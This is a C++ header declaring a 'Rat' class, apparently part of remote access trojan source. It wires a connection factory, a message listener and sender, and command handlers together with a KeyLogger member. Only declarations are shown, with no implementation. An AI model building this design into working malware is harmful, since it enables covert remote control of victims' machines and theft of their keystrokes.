#pragma once

#include <map>

#include "ICommunicationFactory.h"
#include "IMessageHandler.h"
#include "IRat.h"
#include "KeyLogger.h"
#include "IThreadGuard.h"

class Rat : public IRat
{
public:
	Rat(ICommunicationFactory* factory, std::unique_ptr<IConnectionFactory> client);

private:
	std::map<MessageType, std::shared_ptr<IMessageHandler>> GetHandlers();

	void OnMessage(MessageType type, SharedSpan content);
	void OnDisconnection();

	std::unique_ptr<IConnectionFactory> _client;
	std::unique_ptr<IConnection> _connection;
	std::unique_ptr<IMessageSender> _sender;
	std::unique_ptr<IMessageListener> _listener;
	std::map<MessageType, std::shared_ptr<IMessageHandler>> _handlers;
	KeyLogger _keylogger;
};
